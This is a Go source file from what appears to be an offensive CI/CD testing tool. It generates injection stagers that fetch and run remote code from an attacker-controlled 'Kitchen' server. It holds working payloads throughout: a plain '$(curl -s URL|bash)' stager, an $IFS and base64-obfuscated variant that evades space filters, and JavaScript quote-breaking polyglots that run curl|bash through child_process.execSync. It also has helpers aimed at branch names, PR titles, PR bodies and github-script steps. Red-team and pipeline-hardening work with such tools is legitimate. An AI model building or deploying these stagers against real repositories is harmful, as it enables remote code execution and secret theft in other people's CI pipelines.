// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package rye

import (
	"encoding/base64"
	"fmt"
	"strings"

	"github.com/boostsecurityio/smokedmeat/internal/stagerurl"
)

// Mode represents the injection automation level.
type Mode int

const (
	// ModeManual provides building blocks - user constructs the final payload.
	// Shows available techniques, constraints, and encoding helpers.
	ModeManual Mode = iota

	// ModeSemiAuto provides insight + editable templates.
	// Detects what's possible, generates template, allows modification.
	ModeSemiAuto

	// ModeFullAuto provides menu -> preview -> execute.
	// Ready-to-use payloads with Kitchen integration.
	ModeFullAuto
)

// Stager represents a callback stager that phones home to Kitchen.
// The stager is a minimal payload that fits within injection constraints
// and retrieves the actual payload from Kitchen.
type Stager struct {
	ID           string           // Random ID registered with Kitchen
	KitchenURL   string           // Base Kitchen URL (e.g., "http://kitchen.example.com")
	Context      InjectionContext // Target injection context
	ResponseType string           // What Kitchen returns: "bash", "js", "python"
}

// StagerPayload is the generated payload for a specific context.
type StagerPayload struct {
	Raw         string // The actual payload string to inject
	Encoded     string // Base64 encoded callback URL (for constrained contexts)
	Context     string // Context name
	Technique   string // e.g., "ifs_curl_bash", "js_template_exec"
	KitchenPath string // Full callback URL (/r/{id})
	CallbackURL string // Full URL to Kitchen stager endpoint
	Notes       string // Usage notes
	Mode        Mode   // Which mode generated this
}

// NewStager creates a new stager with a random ID.
func NewStager(kitchenURL string, ctx InjectionContext) *Stager {
	return &Stager{
		ID:           generateStagerID(),
		KitchenURL:   strings.TrimSuffix(kitchenURL, "/"),
		Context:      ctx,
		ResponseType: "bash", // Default to bash
	}
}

// NewStagerWithID creates a new stager with a specific ID (for testing).
func NewStagerWithID(id, kitchenURL string, ctx InjectionContext) *Stager {
	return &Stager{
		ID:           id,
		KitchenURL:   strings.TrimSuffix(kitchenURL, "/"),
		Context:      ctx,
		ResponseType: "bash",
	}
}

// CallbackURL returns the full callback URL.
func (s *Stager) CallbackURL() string {
	return stagerurl.Join(s.KitchenURL, s.ID)
}

// Generate creates a stager payload appropriate for the context.
func (s *Stager) Generate() StagerPayload {
	switch s.Context.Language {
	case LangJavaScript:
		// Universal polyglot works for both single and double quote contexts
		return s.GeneratePolyglot()
	default:
		// For bash contexts, check if we need $IFS encoding
		if s.needsIFSEncoding() {
			return s.generateIFSStager()
		}
		return s.generateBashStager()
	}
}

// needsIFSEncoding checks if the context forbids spaces.
func (s *Stager) needsIFSEncoding() bool {
	for _, c := range s.Context.ForbiddenChars {
		if c == ' ' {
			return true
		}
	}
	return false
}

// generateBashStager creates a standard bash curl|bash stager.
func (s *Stager) generateBashStager() StagerPayload {
	callbackURL := s.CallbackURL()
	raw := fmt.Sprintf("$(curl -s %s|bash)", callbackURL)

	return StagerPayload{
		Raw:         raw,
		Context:     s.Context.Name,
		Technique:   "curl_bash",
		KitchenPath: stagerurl.Path(s.ID),
		CallbackURL: callbackURL,
		Notes:       "Standard curl|bash stager. Requires curl in PATH.",
	}
}

// generateIFSStager creates a stager using $IFS for space-constrained contexts.
// Format: $(curl${IFS}-s${IFS}$(base64${IFS}-d<<<ENCODED)|bash)
func (s *Stager) generateIFSStager() StagerPayload {
	callbackURL := s.CallbackURL()
	encodedURL := base64.StdEncoding.EncodeToString([]byte(callbackURL))

	// $IFS replaces spaces, base64-encoded URL avoids special chars
	// Using heredoc <<< to pass encoded URL to base64 -d
	raw := fmt.Sprintf("$(curl${IFS}-s${IFS}$(base64${IFS}-d<<<'%s')|bash)", encodedURL)

	// Check if it fits
	if s.Context.MaxLength > 0 && len(raw) > s.Context.MaxLength {
		// Try shorter variant without -s
		raw = fmt.Sprintf("$(curl${IFS}$(base64${IFS}-d<<<'%s')|bash)", encodedURL)
	}

	// Validate against forbidden chars (except space which we handled)
	raw = s.sanitizeForContext(raw)

	return StagerPayload{
		Raw:         raw,
		Encoded:     encodedURL,
		Context:     s.Context.Name,
		Technique:   "ifs_base64_curl_bash",
		KitchenPath: stagerurl.Path(s.ID),
		CallbackURL: callbackURL,
		Notes:       fmt.Sprintf("Uses $IFS for spaces, base64-encoded URL. Decoded URL: %s", callbackURL),
	}
}

// GeneratePolyglot creates a JS polyglot that works in both single and double quote contexts.
// This is the primary payload for actions/github-script injection.
func (s *Stager) GeneratePolyglot() StagerPayload {
	callbackURL := s.CallbackURL()

	// Universal polyglot for both " and ' contexts:
	//   ";require('child_process').execSync('curl URL|bash');/*';require('child_process').execSync('curl URL|bash');//*/
	//
	// How it works:
	// - In double quotes: "" closes quote, executes first require(), /* comments out the rest
	// - In single quotes: the /*' ends the string, second require() executes, //*/ closes comment
	curlCmd := fmt.Sprintf("curl -s %s|bash", callbackURL)
	polyglot := fmt.Sprintf(
		`";require('child_process').execSync('%s');/*';require('child_process').execSync('%s');//*/`,
		curlCmd, curlCmd,
	)

	return StagerPayload{
		Raw:         polyglot,
		Context:     s.Context.Name,
		Technique:   "js_quote_polyglot",
		KitchenPath: stagerurl.Path(s.ID),
		CallbackURL: callbackURL,
		Notes:       "Universal polyglot - works in both single and double quote JS contexts.",
	}
}

// GenerateSingleQuoteBreak creates a JS payload specifically for single-quote contexts.
func (s *Stager) GenerateSingleQuoteBreak() StagerPayload {
	callbackURL := s.CallbackURL()
	curlCmd := fmt.Sprintf("curl -s %s|bash", callbackURL)
	payload := fmt.Sprintf(`');require('child_process').execSync('%s');('`, curlCmd)

	return StagerPayload{
		Raw:         payload,
		Context:     s.Context.Name,
		Technique:   "js_single_quote_break",
		KitchenPath: stagerurl.Path(s.ID),
		CallbackURL: callbackURL,
		Notes:       "Single-quote JS string break payload.",
	}
}

// sanitizeForContext removes/replaces chars that would break the context.
// Currently a no-op for most cases as payloads are designed to avoid forbidden chars.
func (s *Stager) sanitizeForContext(payload string) string {
	// For spaces, we already use $IFS in the payload generation.
	// Other forbidden chars (like ~^:?*[@\) are already avoided by design.
	// Future: could add URL-encoding or alternative encoding for edge cases.
	return payload
}

// generateStagerID creates a random 8-byte hex ID.
func generateStagerID() string {
	return stagerurl.GenerateID()
}

// BranchNameStager is a convenience function for git branch injection.
func BranchNameStager(kitchenURL string) *Stager {
	return NewStager(kitchenURL, BranchName)
}

// PRTitleStager is a convenience function for PR title injection.
func PRTitleStager(kitchenURL string) *Stager {
	return NewStager(kitchenURL, PRTitle)
}

// PRBodyStager is a convenience function for PR body injection.
func PRBodyStager(kitchenURL string) *Stager {
	return NewStager(kitchenURL, PRBody)
}

// GitHubScriptStager is a convenience function for github-script injection.
func GitHubScriptStager(kitchenURL string) *Stager {
	return NewStager(kitchenURL, GitHubScript)
}
